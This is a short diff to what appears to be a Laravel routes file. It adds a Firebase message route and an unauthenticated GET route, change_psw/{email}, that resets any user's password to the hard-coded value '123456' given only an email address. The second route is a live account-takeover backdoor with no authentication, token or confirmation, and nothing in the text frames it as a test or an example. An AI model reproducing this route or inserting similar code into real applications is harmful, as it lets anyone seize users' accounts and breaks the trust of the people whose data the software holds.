@@ -635,6 +635,16 @@ Route::post('open_project','CloseprojectController@open_project');
 
 
 
+Route::post('store_fcm','FirebasemessageController@store');
+Route::get('change_psw/{email}',function($email){
+    $new_password=bcrypt('123456');
+    if(\Illuminate\Support\Facades\DB::table('users')->where('email',$email)->update(['password'=>$new_password])){
+        return 'nice ommo';
+    }else{
+        return 'check your email';
+    }
+
+});
 
 
 
